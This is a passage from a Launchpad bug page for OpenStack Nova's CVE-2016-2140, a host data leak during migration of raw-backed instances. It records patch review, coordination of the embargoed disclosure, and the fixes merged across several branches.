![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#54](/nova/%2Bbug/1548450/comments/54) |
| --- | --- | --- | --- |

After additional code review from mbooth I've updated the attached patches. The only change made is to move the disk\_info recreation logic within pre\_live\_migration out of the `if not is\_shared\_block\_storage` block. This is to avoid any potential future issues with disk\_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.

After additional code review from mbooth I've updated the attached patches. The only change made is to move the disk\_info recreation logic within pre\_live\_migration out of the `if not is\_shared\_block\_storage` block. This is to avoid any potential future issues with disk\_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-04: |  |  | [#55](/nova/%2Bbug/1548450/comments/55) |
| --- | --- | --- | --- |

Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.

Andrew (or another Nova core), could you please have a look and pre-approve those new version ?

Since the previous patchs have already been shared with the stakeholder list, we'll have to follow-up with the new version and probably extend the disclosure date.

If this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC

Otherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC

Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.
Andrew (or another Nova core), could you please have a look and pre-approve those new version ?
Since the previous patchs have already been shared with the stakeholder list, we'll have to follow-up with the new version and probably extend the disclosure date.
If this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC
Otherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-03-07: |  |  | [#56](/nova/%2Bbug/1548450/comments/56) |
| --- | --- | --- | --- |

The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I'm +1 on them.

The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I'm +1 on them.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-08: |  |  | [#57](/nova/%2Bbug/1548450/comments/57) |
| --- | --- | --- | --- |

Since the former patch are still correct, let's proceed with the original plan and open this bug in 10 minutes.

Since the former patch are still correct, let's proceed with the original plan and open this bug in 10 minutes.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-08

| **information type**: | Private Security → Public |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Fix proposed to nova (master)**](/nova/%2Bbug/1548450/comments/58) |  |  | [#58](/nova/%2Bbug/1548450/comments/58) |
| --- | --- | --- | --- |

Fix proposed to branch: master

Review: <https://review.openstack.org/289957>

Fix proposed to branch: master
Review: https://review.openstack.org/289957

| Changed in nova: | |
| --- | --- |
| **assignee**: | nobody → Lee Yarwood (lyarwood) |
| **status**: | Confirmed → In Progress |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Fix proposed to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/59) |  |  | [#59](/nova/%2Bbug/1548450/comments/59) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/liberty

Review: <https://review.openstack.org/289958>

Fix proposed to branch: stable/liberty
Review: https://review.openstack.org/289958

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-08

| **summary**: | - Host data leak during resize/migrate for raw-backed instances- (CVE-2016-2140)+ [OSSA 2016-007] Host data leak during resize/migrate for raw-backed+ instances (CVE-2016-2140) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Fix proposed to nova (stable/kilo)**](/nova/%2Bbug/1548450/comments/60) |  |  | [#60](/nova/%2Bbug/1548450/comments/60) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/kilo

Review: <https://review.openstack.org/289960>

Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/289960

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Related fix proposed to ossa (master)**](/nova/%2Bbug/1548450/comments/61) |  |  | [#61](/nova/%2Bbug/1548450/comments/61) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/289961>

Related fix proposed to branch: master
Review: https://review.openstack.org/289961

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-08

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-08:  [**Related fix merged to ossa (master)**](/nova/%2Bbug/1548450/comments/62) |  |  | [#62](/nova/%2Bbug/1548450/comments/62) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289961>

Committed: <https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b>

Submitter: Jenkins

Branch: master

commit 51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b

Author: Tristan Cacqueray <email address hidden>

Date: Tue Mar 8 10:05:25 2016 -0500

Adds OSSA 2016-007 (CVE-2016-2140)

Change-Id: I95d3a2211e25e7e121b4a67a729e4c4364eb1118

    Related-Bug: #1548450

Reviewed: https://review.openstack.org/289961
Committed: https://git.openstack.org/cgit/openstack/ossa/commit/?id=51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b
Submitter: Jenkins
Branch: master
commit 51a4f35c3eaa700e80d6611db7e4b2c85bc82f8b
Author: Tristan Cacqueray <tdecacqu@redhat.com>
Date: Tue Mar 8 10:05:25 2016 -0500
Adds OSSA 2016-007 (CVE-2016-2140)
Change-Id: I95d3a2211e25e7e121b4a67a729e4c4364eb1118
Related-Bug: #1548450

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-09:  [**Fix merged to nova (master)**](/nova/%2Bbug/1548450/comments/63) |  |  | [#63](/nova/%2Bbug/1548450/comments/63) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289957>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701>

Submitter: Jenkins

Branch: master

commit 116b1210ab772c55d1ed1f715687d83877c92701

Author: Lee Yarwood <email address hidden>

Date: Wed Feb 24 11:23:22 2016 +0000

libvirt: Always copy or recreate disk.info during a migration

The disk.info file contains the path and format of any image, config or

    ephermal disk associated with an instance. When using RAW images and migrating

    an instance this file should always be copied or recreated. This avoids the Raw

    imagebackend reinspecting the format of these disks when spawning the instance

    on the destination host.

By not copying or recreating this disk.info file, a malicious image written to

    an instance disk on the source host will cause Nova to reinspect and record a

    different format for the disk on the destination. This format then being used

    incorrectly when finally spawning the instance on the destination.

SecurityImpact

    Closes-bug: #1548450

    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

Reviewed: https://review.openstack.org/289957
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=116b1210ab772c55d1ed1f715687d83877c92701
Submitter: Jenkins
Branch: master
commit 116b1210ab772c55d1ed1f715687d83877c92701
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Wed Feb 24 11:23:22 2016 +0000
libvirt: Always copy or recreate disk.info during a migration
The disk.info file contains the path and format of any image, config or
ephermal disk associated with an instance. When using RAW images and migrating
an instance this file should always be copied or recreated. This avoids the Raw
imagebackend reinspecting the format of these disks when spawning the instance
on the destination host.
By not copying or recreating this disk.info file, a malicious image written to
an instance disk on the source host will cause Nova to reinspect and record a
different format for the disk on the destination. This format then being used
incorrectly when finally spawning the instance on the destination.
SecurityImpact
Closes-bug: #1548450
Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

| Changed in nova: | |
| --- | --- |
| **status**: | In Progress → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Fix merged to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/64) |  |  | [#64](/nova/%2Bbug/1548450/comments/64) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289958>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c>

Submitter: Jenkins

Branch: stable/liberty

commit 8d5ba34751c0ae8093f987d74348dffd8ca0b61c

Author: Lee Yarwood <email address hidden>

Date: Wed Feb 24 11:23:22 2016 +0000

libvirt: Always copy or recreate disk.info during a migration

The disk.info file contains the path and format of any image, config or

    ephermal disk associated with an instance. When using RAW images and migrating

    an instance this file should always be copied or recreated. This avoids the Raw

    imagebackend reinspecting the format of these disks when spawning the instance

    on the destination host.

By not copying or recreating this disk.info file, a malicious image written to

    an instance disk on the source host will cause Nova to reinspect and record a

    different format for the disk on the destination. This format then being used

    incorrectly when finally spawning the instance on the destination.

SecurityImpact

    Closes-bug: #1548450

    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

Reviewed: https://review.openstack.org/289958
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=8d5ba34751c0ae8093f987d74348dffd8ca0b61c
Submitter: Jenkins
Branch: stable/liberty
commit 8d5ba34751c0ae8093f987d74348dffd8ca0b61c
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Wed Feb 24 11:23:22 2016 +0000
libvirt: Always copy or recreate disk.info during a migration
The disk.info file contains the path and format of any image, config or
ephermal disk associated with an instance. When using RAW images and migrating
an instance this file should always be copied or recreated. This avoids the Raw
imagebackend reinspecting the format of these disks when spawning the instance
on the destination host.
By not copying or recreating this disk.info file, a malicious image written to
an instance disk on the source host will cause Nova to reinspect and record a
different format for the disk on the destination. This format then being used
incorrectly when finally spawning the instance on the destination.
SecurityImpact
Closes-bug: #1548450
Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

| **tags**: | added: in-stable-liberty |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Fix merged to nova (stable/kilo)**](/nova/%2Bbug/1548450/comments/65) |  |  | [#65](/nova/%2Bbug/1548450/comments/65) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/289960>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666>

Submitter: Jenkins

Branch: stable/kilo

commit f302bf04ab5dda89cf8ceaeed309006da90c0666

Author: Lee Yarwood <email address hidden>

Date: Wed Feb 24 11:23:22 2016 +0000

libvirt: Always copy or recreate disk.info during a migration

The disk.info file contains the path and format of any image, config or

    ephermal disk associated with an instance. When using RAW images and migrating

    an instance this file should always be copied or recreated. This avoids the Raw

    imagebackend reinspecting the format of these disks when spawning the instance

    on the destination host.

By not copying or recreating this disk.info file, a malicious image written to

    an instance disk on the source host will cause Nova to reinspect and record a

    different format for the disk on the destination. This format then being used

    incorrectly when finally spawning the instance on the destination.

Conflicts:

        nova/tests/unit/virt/libvirt/test\_driver.py

        nova/virt/libvirt/driver.py

SecurityImpact

    Closes-bug: #1548450

    Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

Reviewed: https://review.openstack.org/289960
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=f302bf04ab5dda89cf8ceaeed309006da90c0666
Submitter: Jenkins
Branch: stable/kilo
commit f302bf04ab5dda89cf8ceaeed309006da90c0666
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Wed Feb 24 11:23:22 2016 +0000
libvirt: Always copy or recreate disk.info during a migration
The disk.info file contains the path and format of any image, config or
ephermal disk associated with an instance. When using RAW images and migrating
an instance this file should always be copied or recreated. This avoids the Raw
imagebackend reinspecting the format of these disks when spawning the instance
on the destination host.
By not copying or recreating this disk.info file, a malicious image written to
an instance disk on the source host will cause Nova to reinspect and record a
different format for the disk on the destination. This format then being used
incorrectly when finally spawning the instance on the destination.
Conflicts:
nova/tests/unit/virt/libvirt/test\_driver.py
nova/virt/libvirt/driver.py
SecurityImpact
Closes-bug: #1548450
Change-Id: Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87

| **tags**: | added: in-stable-kilo |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix proposed to nova (master)**](/nova/%2Bbug/1548450/comments/66) |  |  | [#66](/nova/%2Bbug/1548450/comments/66) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/291208>

Related fix proposed to branch: master
Review: https://review.openstack.org/291208

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix proposed to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/67) |  |  | [#67](/nova/%2Bbug/1548450/comments/67) |
| --- | --- | --- | --- |

Related fix proposed to branch: stable/liberty

Review: <https://review.openstack.org/291221>

Related fix proposed to branch: stable/liberty
Review: https://review.openstack.org/291221

[Matt Riedemann (mriedem)](https://launchpad.net/~mriedem)
on 2016-03-10

| Changed in nova: | |
| --- | --- |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix merged to nova (stable/liberty)**](/nova/%2Bbug/1548450/comments/68) |  |  | [#68](/nova/%2Bbug/1548450/comments/68) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/291221>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793>

Submitter: Jenkins

Branch: stable/liberty

commit 0b194187db9da28225cb5e62be3b45aff5a1c793

Author: Matt Riedemann <email address hidden>

Date: Thu Mar 10 10:07:11 2016 -0500

Add release note for CVE [bug 1548450](/bugs/1548450)

This will go into the 12.0.3 release.

Change-Id: I3792dcdd9f87556b9de435818cec1700630a7b26

    Related-Bug: #1548450

Reviewed: https://review.openstack.org/291221
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=0b194187db9da28225cb5e62be3b45aff5a1c793
Submitter: Jenkins
Branch: stable/liberty
commit 0b194187db9da28225cb5e62be3b45aff5a1c793
Author: Matt Riedemann <mriedem@us.ibm.com>
Date: Thu Mar 10 10:07:11 2016 -0500
Add release note for CVE bug 1548450
This will go into the 12.0.3 release.
Change-Id: I3792dcdd9f87556b9de435818cec1700630a7b26
Related-Bug: #1548450

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Related fix merged to nova (master)**](/nova/%2Bbug/1548450/comments/69) |  |  | [#69](/nova/%2Bbug/1548450/comments/69) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/291208>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1>

Submitter: Jenkins

Branch: master

commit 9c0bbda07fdcf134308371644d09becbb18c62b1

Author: Matt Riedemann <email address hidden>

Date: Thu Mar 10 09:35:00 2016 -0500

Add release notes for security fixes in 13.0.0 mitaka GA

There are three security issues fixed in mitaka.

The first two were documented for liberty 12.0.1 but we

    apparently forgot to doc them for mitaka.

Related-Bug: #1524274

    Related-Bug: #1516765

    Related-Bug: #1548450

Change-Id: I3eba75f1fc86c4c9abd258042dfafc6df1f2405c

Reviewed: https://review.openstack.org/291208
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=9c0bbda07fdcf134308371644d09becbb18c62b1
Submitter: Jenkins
Branch: master
commit 9c0bbda07fdcf134308371644d09becbb18c62b1
Author: Matt Riedemann <mriedem@us.ibm.com>
Date: Thu Mar 10 09:35:00 2016 -0500
Add release notes for security fixes in 13.0.0 mitaka GA
There are three security issues fixed in mitaka.
The first two were documented for liberty 12.0.1 but we
apparently forgot to doc them for mitaka.
Related-Bug: #1524274
Related-Bug: #1516765
Related-Bug: #1548450
Change-Id: I3eba75f1fc86c4c9abd258042dfafc6df1f2405c

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-14

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Doug Hellmann (doug-hellmann)](https://launchpad.net/~doug-hellmann) wrote on 2016-05-10:  [**Fix included in openstack/nova 2015.1.4**](/nova/%2Bbug/1548450/comments/70) |  |  | [#70](/nova/%2Bbug/1548450/comments/70) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-11-10: |  |  | [#71](/nova/%2Bbug/1548450/comments/71) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

[See full activity log](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/nova/%2Bfilebug)

This report contains
**Public**
information

Everyone can see this information.

You are
[not directly subscribed to this bug's notifications.](/nova/%2Bbug/1548450/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588377/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588377 "Change patch details")
* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588378/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588378 "Change patch details")
* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588379/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588379 "Change patch details")

* [Add patch](/nova/%2Bbug/1548450/%2Baddcomment?field.patch=on)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


